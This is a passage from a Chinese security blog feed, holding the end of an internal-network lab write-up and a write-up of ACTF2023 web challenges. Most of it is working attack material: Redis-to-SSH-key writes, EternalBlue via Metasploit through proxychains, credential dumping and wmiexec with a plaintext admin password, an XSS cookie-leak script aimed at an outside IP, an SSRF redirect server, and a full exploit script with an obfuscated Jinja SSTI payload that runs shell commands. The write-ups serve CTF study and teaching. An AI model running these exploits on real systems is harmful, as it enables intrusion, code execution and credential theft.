#把foo.txt文件内容写入目标主机的redis缓冲中</span><br><span class="line">config set dir /root/.ssh    # 设置redis的备份路径为/root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys    # 设置保存文件名为authorized_keys</span><br><span class="line">save    # 将数据保存在目标服务器硬盘上</span><br><span class="line">ssh 10.6.221.204 # 连接</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231103214807152.png" alt="image-20231103214807152"></p><p>成功连上 <img src="../images/image-20231103214824015.png" alt="image-20231103214824015"></p><p>这就是我们所访问的这个外网ip了</p><p>然后去查看其nginx配置文件</p><p><img src="../images/image-20231103220039114.png" alt="image-20231103220039114"></p><p>确实和我们想的一样  做了nginx反向代理   所以我们访问<code>10.6.221.204:81</code>端口时  访问的却是<code>http://192.168.52.20:8000</code></p><p>docker也是在这个上面的启动的</p><p>那么整理一下</p><p><img src="../images/image-20231103220420776.png" alt="image-20231103220420776"></p><p>虽然说是第二层网络  但是这个192.168.52.20是出网的  我们直接可以拿来当第一层来打</p><p>然后直接先上传fscan上去扫一下93这个c段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(icmp) Target 192.168.93.20   is alive</span><br><span class="line">(icmp) Target 192.168.93.40   is alive</span><br><span class="line">(icmp) Target 192.168.93.10   is alive</span><br><span class="line">(icmp) Target 192.168.93.30   is alive</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231103220921129.png" alt="image-20231103220921129"></p><p>这里的话是一共有4个主机在域内</p><p>但是你这么一看的话 域控和另一台主机是MS17  那么直接打就行了</p><p>信息整理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">192.168.93.20   PC1.whoamianony.org</span><br><span class="line"></span><br><span class="line">192.168.93.40   PC2.whoamianony.org</span><br><span class="line"></span><br><span class="line">192.168.93.30   [+]DC DC.whoamianony.org</span><br></pre></td></tr></table></figure><p>挂代理然后开打</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp_uuid  //这个是个关键了 可以配合proxychains4本地使用</span><br><span class="line">set RHOSTS 192.168.93.20</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>然后拿下PC1  之后   是system权限  然后creds_all拿下域控账号密码</p><p>然后psexec直接上域控就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains wmiexec.py whoamianony.org/Administrator:&#x27;Whoami2021&#x27;@DC.whoamianony.org -dc-ip 192.168.93.30</span><br></pre></td></tr></table></figure><p>然后就结束了………………………..</p><p>这个域环境太简单了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;打之前把防火墙全关了  不然容易打一些步骤的时候会报错&lt;/p&gt;
&lt;p&gt;这个靶机没云镜的好玩  域渗透的过程过于简单了  MS17梭哈全场&lt;/p&gt;
&lt;p&gt;(实际上说是两层代理  其实就一层代理  52是可以出网的  只有93是内网)&lt;/p&gt;
&lt;p&gt;防火墙记得关一下就行了&lt;/p</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>ACTF2023-Web</title>
    <link href="https://ke1nys.github.io/posts/c2eb5b43.html"/>
    <id>https://ke1nys.github.io/posts/c2eb5b43.html</id>
    <published>2023-10-31T01:37:37.000Z</published>
    <updated>2023-11-07T14:23:59.799Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://su-team.cn/passages/2023-10-28-ACTF/">https://su-team.cn/passages/2023-10-28-ACTF/</a></p><p><a href="https://wm-ctf-team.feishu.cn/docx/PLbbdhwdyoAefuxokXwcYppzn1c">https://wm-ctf-team.feishu.cn/docx/PLbbdhwdyoAefuxokXwcYppzn1c</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzk0NjM5OTc1NQ==&amp;mid=2247483873&amp;idx=1&amp;sn=3b771293296edae5cf913c2bc85ba1a8&amp;chksm=c307fe85f4707793149c2aeebe76c086e375f9f666c143b68556e5fa358fa62694533cc630e8&amp;mpshare=1&amp;scene=23&amp;srcid=10317I620Rz9DLyGPvjH4heX&amp;sharer_shareinfo=fa0d322996aa33d12e0962e62f42eb67&amp;sharer_shareinfo_first=fa0d322996aa33d12e0962e62f42eb67#rd">https://mp.weixin.qq.com/s?__biz=Mzk0NjM5OTc1NQ==&amp;mid=2247483873&amp;idx=1&amp;sn=3b771293296edae5cf913c2bc85ba1a8&amp;chksm=c307fe85f4707793149c2aeebe76c086e375f9f666c143b68556e5fa358fa62694533cc630e8&amp;mpshare=1&amp;scene=23&amp;srcid=10317I620Rz9DLyGPvjH4heX&amp;sharer_shareinfo=fa0d322996aa33d12e0962e62f42eb67&amp;sharer_shareinfo_first=fa0d322996aa33d12e0962e62f42eb67#rd</a></p><h2 id="craftcms"><a href="#craftcms" class="headerlink" title="craftcms"></a>craftcms</h2><p>题目关了  就讲讲思路就行了</p><p>这题直接搜就出来poc了</p><p><a href="http://www.bmth666.cn/2023/09/26/CVE-2023-41892-CraftCMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">http://www.bmth666.cn/2023/09/26/CVE-2023-41892-CraftCMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p><p>这里是可以直接看phpinfo的  这里的话就可以看到一个有imagick这个插件  直接就p牛有一篇文章就是讲的这个</p><p>这个插件的话是可以写shell的  这里直接用上面师傅给的poc就行 </p><p><img src="../images/image-20231031195450270.png" alt="image-20231031195450270"></p><p><strong>(这道题的思路其实和之前比赛的哪道题很相似来着 就是有文件包含和文件写入)</strong></p><p>得写到tmp目录下  其他目录不可写</p><p>这里的话其实pearcmd也行  直接去包含这个pearcmd.php文件  发现有返回结果后  直接去用就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/lib/php/pearcmd.php</span><br></pre></td></tr></table></figure><p>看完别人的wp发现  其实session临时文件上传也是可以做的</p><p><a href="https://su-team.cn/passages/2023-10-28-ACTF/">https://su-team.cn/passages/2023-10-28-ACTF/</a>  贴个链接  直接看就行了</p><h2 id="easy-latex"><a href="#easy-latex" class="headerlink" title="easy latex"></a>easy latex</h2><p>题目环境关了  没办法复现了…………..</p><p><img src="../images/image-20231031212656052.png" alt="image-20231031212656052"></p><p>其实关键点就在这个地方</p><p>这里的话传进来的theme参数可以覆盖掉后后面的URL</p><p><img src="../images/image-20231031212910445.png" alt="image-20231031212910445"></p><p>这就是关键点了  我们可以起一个服务  来测试/priview这个路由下会不会造成xss</p><p><img src="../images/image-20231031213108129.png" alt="image-20231031213108129"></p><p><img src="../images/image-20231031213130554.png" alt="image-20231031213130554"></p><p>发现是存在这种可能性的</p><p>然后我们再来看这个note和share路由</p><p><img src="../images/image-20231031213606521.png" alt="image-20231031213606521"></p><p><img src="../images/image-20231031213617498.png" alt="image-20231031213617498"></p><p>相较于这个note路由  share路由是没有进行校验的  所以我们可以用这个share路由来做</p><p>并且id我们是可控的  而且这个<code>req.params</code>是支持url解码的</p><p>然后进入到这个visit函数</p><p><img src="../images/image-20231031213916915.png" alt="image-20231031213916915"></p><p>我们是不能直接外带cookie的  因为设置了这个httpOnly</p><p><img src="../images/image-20231031214041569.png" alt="image-20231031214041569"></p><p>然后再看这个vip路由  他是回拿着cookie去访问一个网站  并且将响应包返回  这里就可以帮我们把cookie带出来了</p><p>所以思路就是</p><p>我们通过priview路由测试得知  username可控并且可以xss  那么我们就直接再login路由的时候设置好username（因为再看vip路由的时候 username是从session中取出来的  然后再让其访问vip路由将cookie发送出来就行了）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/share/../preview?tex=awdadawd&amp;theme=//112.124.44.238:8000/a</span><br><span class="line"></span><br><span class="line">进行url全编码就行了</span><br></pre></td></tr></table></figure><p>恶意js代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">fetch(&#x27;/login&#x27;,&#123;</span><br><span class="line">    method:&quot;POST&quot;,</span><br><span class="line">    redirect:&quot;follow&quot;,</span><br><span class="line">    headers: &#123;</span><br><span class="line">        &#x27;Content-Type&#x27;: &quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    body:&quot;username=http://114.116.119.253:7777&amp;password=c2ceb7948ba609ad5f728c96cae769ba&quot;</span><br><span class="line">&#125;);</span><br><span class="line">console.log(&#x27;first&#x27;);</span><br><span class="line">function exp()&#123;</span><br><span class="line">fetch(&#x27;/vip&#x27;,&#123;</span><br><span class="line">    method:&quot;POST&quot;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><p>然后这样就结束了</p><p> 其他wp也有其他方式的js文件  自己去查来看看就行了</p><h2 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h2><p>环境也关了………………</p><p>这道题的话其实信息检索能力到位的话  是很容易就出的</p><p><a href="https://www.paloaltonetworks.com/blog/prisma-cloud/repository-webhook-abuse-access-ci-cd-systems-at-scale/">https://www.paloaltonetworks.com/blog/prisma-cloud/repository-webhook-abuse-access-ci-cd-systems-at-scale/</a></p><p><a href="https://www.youtube.com/watch?v=wrRha2vwv6Q">https://www.youtube.com/watch?v=wrRha2vwv6Q</a></p><p>特别是这个youtube视频  如果当时查到的话必出  </p><p>webhooks这个东西的话github和gitlab是各有一个  只不过GitHub的是只能post发包  gitlab的话是可以get发包</p><p><img src="../images/image-20231031220135615.png" alt="image-20231031220135615"></p><p>就是这个玩意</p><p><img src="../images/image-20231031220915012.png" alt="image-20231031220915012"></p><p>gitlab里面也是有一个webhooks</p><p>就是现在服务器上搭建一个flask服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, redirect, request</span><br><span class="line">from urllib.parse import unquote</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.post(&#x27;/redirect&#x27;)</span><br><span class="line">def perform_redirect():</span><br><span class="line">    redirect_url = request.args.get(&#x27;redirect_url&#x27;)</span><br><span class="line">    if redirect_url:</span><br><span class="line">        return redirect(redirect_url, code=302)</span><br><span class="line">    else:</span><br><span class="line">        return &quot;Missing &#x27;redirect_url&#x27; parameter&quot;, 400</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(&quot;0.0.0.0&quot;, port =1234, debug=True)</span><br></pre></td></tr></table></figure><p>然后再使用gitlab的webhooks发包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.42.39.110:1234/redirect?redirect_url=题目地址</span><br></pre></td></tr></table></figure><p>然后就会返回告诉你</p><p><img src="../images/image-20231031222011605.png" alt="image-20231031222011605"></p><p>这次的话就可以直接贴内网地址了 <code>http://jenkins:8080/</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.42.39.110:1234/redirect?redirect_url=题目地址&amp;redirect_url=http://jenkins:8080/</span><br></pre></td></tr></table></figure><p>然后就会返回jenkins的版本号  然后我们直接去找poc打就出了</p><p>CVE-2019-100030洞是这个  接下去找这个poc来打就ok了</p><h2 id="Story"><a href="#Story" class="headerlink" title="Story"></a>Story</h2><p>这个题考的就是之前p牛发的文章里的那个<code>jumpserver</code>随机数预测</p><p>漏洞点就在这个key处</p><p><img src="../images/image-20231031222936757.png" alt="image-20231031222936757"></p><p><code>random.randint(1,100)</code>这个代码的话是生成1-100之间的随机数  并且这个time.time()的话是生成时间戳  </p><p>key的话是时间戳加上随机数  这样是可以爆破出来的</p><p><img src="../images/image-20231031223548962.png" alt="image-20231031223548962"></p><p>访问一次captcha的话就会返回code  并且种子是全局播种的</p><p>那么我们就可以去看看其code是怎么生成的</p><p><img src="../images/image-20231031223640032.png" alt="image-20231031223640032"></p><p><img src="../images/image-20231031223648359.png" alt="image-20231031223648359"></p><p>就是随机生成四位随机数</p><p>爆破seed脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">while True:</span><br><span class="line">    now = int(time.time())</span><br><span class="line">    session = requests.session()</span><br><span class="line">    all = 0</span><br><span class="line">    payload = &#x27;123&#x27;</span><br><span class="line">    res = session.get(url+&#x27;captcha&#x27;)</span><br><span class="line">    for i in range(1,100):</span><br><span class="line">        gen = Captcha(200, 80,now+i)</span><br><span class="line">        buf , captcha_text = gen.generate()</span><br><span class="line">        if(buf.getvalue()==res.content):</span><br><span class="line">            print(now+i)</span><br><span class="line">            seed = now+i</span><br><span class="line">            print(&#x27;success&#x27;)</span><br></pre></td></tr></table></figure><p>然后在获取到seed后  如何使必须得成为vip才能进行story参数的传参</p><p><img src="../images/image-20231101103601451.png" alt="image-20231101103601451"></p><p><img src="../images/image-20231101102802056.png" alt="image-20231101102802056"></p><p>这里是第二获取到这个code  因为外面已经获取到了这个seed  那么这个code我们在本地就可以运行得出</p><p>然后传上去就能获取到vip了</p><p>在成为vip之后  我们就可以进行story的传参</p><p><img src="../images/image-20231101103650543.png" alt="image-20231101103650543"></p><p><img src="../images/image-20231101103726674.png" alt="image-20231101103726674"></p><p>这个对参数的过滤很有意思   是在6条规则中随机挑选3条  那么就存在三条一样的情况  那么我们就直接在本地进行测试  看看第几次的时候才能存在三条规则一样的情况  <strong>(这里选的是第一条)</strong></p><p>然后我们在写脚本循环访问x-1次  然后最后一次的时候再用payload去打就行了</p><p><img src="../images/image-20231101103843923.png" alt="image-20231101103843923"></p><p>ssti的payload  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set zero = (self|int) %&#125;&#123;% set one = (zero**zero)|int %&#125;&#123;% set two = (zero-one-one)|abs %&#125;&#123;% set four = (two*two)|int %&#125;&#123;% set five = (two*two*two)-one-one-one %&#125;&#123;% set three = five-one-one %&#125;&#123;% set nine = (two*two*two*two-five-one-one) %&#125;&#123;% set seven = (zero-one-one-five)|abs %&#125;&#123;% set space = self|string|min %&#125;&#123;% set point = self|float|string|min %&#125;&#123;% set c = dict(c=aa)|reverse|first %&#125;&#123;% set bfh = self|string|urlencode|first %&#125;&#123;% set bfhc = bfh~c %&#125;&#123;% set slas = bfhc%((four~seven)|int) %&#125;&#123;% set yin = bfhc%((three~nine)|int) %&#125;&#123;% set xhx = bfhc%((nine~five)|int) %&#125;&#123;% set right = bfhc%((four~one)|int) %&#125;&#123;% set left = bfhc%((four~zero)|int) %&#125;&#123;% set but = dict(buil=aa,tins=dd)|join %&#125;&#123;% set imp = dict(imp=aa,ort=dd)|join %&#125;&#123;% set pon = dict(po=aa,pen=dd)|join %&#125;&#123;% set so = dict(o=aa,s=dd)|join %&#125;&#123;% set ca = dict(ca=aa,t=dd)|join %&#125;&#123;% set flg = dict(fl=aa,ag=dd)|join %&#125;&#123;% set ev = dict(ev=aa,al=dd)|join %&#125;&#123;% set red = dict(re=aa,ad=dd)|join %&#125;&#123;% set bul = xhx~xhx~but~xhx~xhx %&#125;&#123;% set ini = dict(ini=aa,t=bb)|join %&#125;&#123;% set glo = dict(glo=aa,bals=bb)|join %&#125;&#123;% set itm = dict(ite=aa,ms=bb)|join %&#125;&#123;% set pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~flg~yin~right~point~red~left~right %&#125;&#123;% for f,v in (self|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %&#125;&#123;% if f == bul %&#125;&#123;% for a,b in (v|attr(itm))() %&#125;&#123;% if a == ev %&#125;&#123;&#123;b(pld)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><strong>testminic  (用来判断什么时候存在三条一样的rule1)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line"></span><br><span class="line">rule = [</span><br><span class="line">    [&#x27;\\x&#x27;,&#x27;[&#x27;,&#x27;]&#x27;,&#x27;.&#x27;,&#x27;getitem&#x27;,&#x27;print&#x27;,&#x27;request&#x27;,&#x27;args&#x27;,&#x27;cookies&#x27;,&#x27;values&#x27;,&#x27;getattribute&#x27;,&#x27;config&#x27;],                   # rule 1</span><br><span class="line">    [&#x27;(&#x27;,&#x27;]&#x27;,&#x27;getitem&#x27;,&#x27;_&#x27;,&#x27;%&#x27;,&#x27;print&#x27;,&#x27;config&#x27;,&#x27;args&#x27;,&#x27;values&#x27;,&#x27;|&#x27;,&#x27;\&#x27;&#x27;,&#x27;\&quot;&#x27;,&#x27;dict&#x27;,&#x27;,&#x27;,&#x27;join&#x27;,&#x27;.&#x27;,&#x27;set&#x27;],              # rule 2</span><br><span class="line">    [&#x27;\&#x27;&#x27;,&#x27;\&quot;&#x27;,&#x27;dict&#x27;,&#x27;,&#x27;,&#x27;config&#x27;,&#x27;join&#x27;,&#x27;\\x&#x27;,&#x27;)&#x27;,&#x27;[&#x27;,&#x27;]&#x27;,&#x27;attr&#x27;,&#x27;__&#x27;,&#x27;list&#x27;,&#x27;globals&#x27;,&#x27;.&#x27;],                           # rule 3</span><br><span class="line">    [&#x27;[&#x27;,&#x27;)&#x27;,&#x27;getitem&#x27;,&#x27;request&#x27;,&#x27;.&#x27;,&#x27;|&#x27;,&#x27;config&#x27;,&#x27;popen&#x27;,&#x27;dict&#x27;,&#x27;doc&#x27;,&#x27;\\x&#x27;,&#x27;_&#x27;,&#x27;\&#123;\&#123;&#x27;,&#x27;mro&#x27;],                          # rule 4</span><br><span class="line">    [&#x27;\\x&#x27;,&#x27;(&#x27;,&#x27;)&#x27;,&#x27;config&#x27;,&#x27;args&#x27;,&#x27;cookies&#x27;,&#x27;values&#x27;,&#x27;[&#x27;,&#x27;]&#x27;,&#x27;\&#123;\&#123;&#x27;,&#x27;.&#x27;,&#x27;request&#x27;,&#x27;|&#x27;,&#x27;attr&#x27;],                          # rule 5</span><br><span class="line">    [&#x27;print&#x27;, &#x27;class&#x27;, &#x27;import&#x27;, &#x27;eval&#x27;, &#x27;__&#x27;, &#x27;request&#x27;,&#x27;args&#x27;,&#x27;cookies&#x27;,&#x27;values&#x27;,&#x27;|&#x27;,&#x27;\\x&#x27;,&#x27;getitem&#x27;]                  # rule 6</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># Make waf more random</span><br><span class="line">def transfrom(number):</span><br><span class="line">    a = random.randint(0,20)</span><br><span class="line">    b = random.randint(0,100)</span><br><span class="line">    return (a * number + b) % 6</span><br><span class="line"></span><br><span class="line">def singel_waf(input, rules):</span><br><span class="line">    input = input.lower()</span><br><span class="line">    for rule in rules:</span><br><span class="line">        if rule in input:</span><br><span class="line">            return False</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">def minic_waf(input):</span><br><span class="line">    waf_seq = random.sample(range(21),3)</span><br><span class="line">    result_2 = None</span><br><span class="line">    result_1 = None</span><br><span class="line">    result_3 = None</span><br><span class="line">    for index in range(len(waf_seq)):</span><br><span class="line">        waf_seq[index] = transfrom(waf_seq[index])</span><br><span class="line">        if index == 0:</span><br><span class="line">            result_1 = rule[waf_seq[index]]</span><br><span class="line">        elif index == 1:</span><br><span class="line">            result_2 = rule[waf_seq[index]]</span><br><span class="line">        else:</span><br><span class="line">            result_3 = rule[waf_seq[index]]</span><br><span class="line">        if(result_1==result_2 ==result_3==[&#x27;\\x&#x27;,&#x27;[&#x27;,&#x27;]&#x27;,&#x27;.&#x27;,&#x27;getitem&#x27;,&#x27;print&#x27;,&#x27;request&#x27;,&#x27;args&#x27;,&#x27;cookies&#x27;,&#x27;values&#x27;,&#x27;getattribute&#x27;,&#x27;config&#x27;]):</span><br><span class="line">            print(result_3)</span><br><span class="line">            return &#x27;1&#x27;</span><br><span class="line">        if not singel_waf(input, rule[waf_seq[index]]):</span><br><span class="line">            return False</span><br><span class="line">    return True</span><br></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import random</span><br><span class="line">from utils.captcha import Captcha</span><br><span class="line">from utils.testminic import *</span><br><span class="line"></span><br><span class="line">def generate_code(length: int = 4,z=0):</span><br><span class="line">    characters = &#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#x27;</span><br><span class="line">    return &#x27;&#x27;.join(random.choice(characters) for _ in range(length))</span><br><span class="line"></span><br><span class="line">url = &#x27;http://124.70.33.170:23001/&#x27;</span><br><span class="line">url = &#x27;http://127.0.0.1:5000/&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    now = int(time.time())</span><br><span class="line">    session = requests.session()</span><br><span class="line">    all = 0</span><br><span class="line">    payload = &#x27;123&#x27;</span><br><span class="line">    res = session.get(url+&#x27;captcha&#x27;)</span><br><span class="line">    for i in range(1,100):</span><br><span class="line">        gen = Captcha(200, 80,now+i)</span><br><span class="line">        buf , captcha_text = gen.generate()</span><br><span class="line">        if(buf.getvalue()==res.content):</span><br><span class="line">            print(now+i)</span><br><span class="line">            seed = now+i</span><br><span class="line">            print(&#x27;success&#x27;)</span><br><span class="line">            gen = Captcha(200, 80,seed)</span><br><span class="line">            buf , captcha_text = gen.generate()</span><br><span class="line">            code = generate_code()</span><br><span class="line">            minic_waf(payload)</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">            x = 0</span><br><span class="line">            while True:</span><br><span class="line">                x+=1</span><br><span class="line">                if minic_waf(payload) == &#x27;1&#x27;:</span><br><span class="line">                    print(x)</span><br><span class="line">                    break</span><br><span class="line">            if(x&gt;10):</span><br><span class="line">                print(&quot;more than 10&quot;)</span><br><span class="line">                time.sleep(1)</span><br><span class="line">                break</span><br><span class="line">            print(&quot;x_all:&quot;+str(x))</span><br><span class="line">            res = session.post(url+&#x27;vip&#x27;,json=&#123;&quot;captcha&quot;:code&#125;)</span><br><span class="line">            print(res.cookies)</span><br><span class="line">            print(&quot;a&quot;)</span><br><span class="line">            res = session.post(url+&#x27;write&#x27;,json=&#123;&quot;story&quot;:payload&#125;)</span><br><span class="line">            print(res.text)</span><br><span class="line">            error = []</span><br><span class="line">            for i in range(x-1):</span><br><span class="line">                res = session.post(url+&#x27;write&#x27;,json=&#123;&quot;story&quot;:payload&#125;)</span><br><span class="line"></span><br><span class="line">                print(i)</span><br><span class="line">            payload = &#x27;&#123;% set zero = (self|int) %&#125;&#123;% set one = (zero**zero)|int %&#125;&#123;% set two = (zero-one-one)|abs %&#125;&#123;% set four = (two*two)|int %&#125;&#123;% set five = (two*two*two)-one-one-one %&#125;&#123;% set three = five-one-one %&#125;&#123;% set nine = (two*two*two*two-five-one-one) %&#125;&#123;% set seven = (zero-one-one-five)|abs %&#125;&#123;% set space = self|string|min %&#125;&#123;% set point = self|float|string|min %&#125;&#123;% set c = dict(c=aa)|reverse|first %&#125;&#123;% set bfh = self|string|urlencode|first %&#125;&#123;% set bfhc = bfh~c %&#125;&#123;% set slas = bfhc%((four~seven)|int) %&#125;&#123;% set yin = bfhc%((three~nine)|int) %&#125;&#123;% set xhx = bfhc%((nine~five)|int) %&#125;&#123;% set right = bfhc%((four~one)|int) %&#125;&#123;% set left = bfhc%((four~zero)|int) %&#125;&#123;% set but = dict(buil=aa,tins=dd)|join %&#125;&#123;% set imp = dict(imp=aa,ort=dd)|join %&#125;&#123;% set pon = dict(po=aa,pen=dd)|join %&#125;&#123;% set so = dict(o=aa,s=dd)|join %&#125;&#123;% set ca = dict(ca=aa,t=dd)|join %&#125;&#123;% set flg = dict(fl=aa,ag=dd)|join %&#125;&#123;% set ev = dict(ev=aa,al=dd)|join %&#125;&#123;% set red = dict(re=aa,ad=dd)|join %&#125;&#123;% set bul = xhx~xhx~but~xhx~xhx %&#125;&#123;% set ini = dict(ini=aa,t=bb)|join %&#125;&#123;% set glo = dict(glo=aa,bals=bb)|join %&#125;&#123;% set itm = dict(ite=aa,ms=bb)|join %&#125;&#123;% set pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~flg~yin~right~point~red~left~right %&#125;&#123;% for f,v in (self|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %&#125;&#123;% if f == bul %&#125;&#123;% for a,b in (v|attr(itm))() %&#125;&#123;% if a == ev %&#125;&#123;&#123;b(pld)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#x27;</span><br><span class="line">            </span><br><span class="line">            res = session.post(url+&#x27;write&#x27;,json=&#123;&quot;story&quot;:payload&#125;)</span><br><span class="line">            print(res.text)</span><br><span class="line">            res = session.get(url+&#x27;story&#x27;)</span><br><span class="line">            print(&quot;result:&quot;)</span><br><span class="line">            print(res.text)</span><br><span class="line">            </span><br><span class="line">            if(&#x27;ACTF&#x27; in res.text):</span><br><span class="line">                exit(0)</span><br><span class="line">            </span><br></pre></td></tr></table></figure><h2 id="MyGO’s-Live"><a href="#MyGO’s-Live" class="headerlink" title="MyGO’s Live!!!!!"></a>MyGO’s Live!!!!!</h2><p>这题其实是参考sekaictf的一道题 